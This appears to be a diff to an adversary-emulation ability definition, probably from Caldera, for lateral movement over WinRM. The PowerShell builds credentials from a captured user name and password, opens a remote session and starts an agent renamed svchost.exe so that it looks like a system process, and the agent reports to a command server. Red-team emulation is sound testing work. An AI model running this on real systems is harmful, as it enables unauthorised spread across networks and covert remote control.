@@ -2,8 +2,8 @@
 ---
 
 - id: 41bb2b7a-75af-49fd-bd15-6c827df25921
-  name: Start Agent
-  description: Start Agent
+  name: Start Agent (WinRM)
+  description: Start Agent using WinRM (WinRM)
   tactic: Lateral-Movement
   technique:
     attack_id: T1021
@@ -12,13 +12,17 @@
     windows:
       psh:
         command: |
-          $username = "#{host.user.name}";
-          $password = "#{host.user.password}";
-          $secstr = New-Object -TypeName System.Security.SecureString;
-          $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
-          $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
-          $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
-          Invoke-WmiMethod -ComputerName #{remote.host.name} -Class Win32_Process -Name Create -ArgumentList "C:\Users\Public\sandcat.exe -Server #{server} -Group #{group}" -Credential $cred
-        payload: sandcat.go
+          $job = Start-Job -ScriptBlock{
+            $username = "#{host.user.name}";
+            $password = "#{host.user.password}";
+            $secstr = New-Object -TypeName System.Security.SecureString;
+            $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+            $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+            $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
+            Invoke-Command -ComputerName ${remote.host.name} -Session $session -ScriptBlock{Start-Process C:\Users\Public\svchost.exe -ArgumentList "-server #{server} -executor psh" -NoNewWindows -PassThru}
+            Remove-PSSession -Session $session
+          };
+          Receive-Job -Job $job -Wait;
+        payload: sandcat.go-windows
         cleanup: |
-          Remove-Item C:\Users\Public\sandcat.exe -Recurse
+          Remove-Item C:\Users\Public\svchost.exe -Recurse
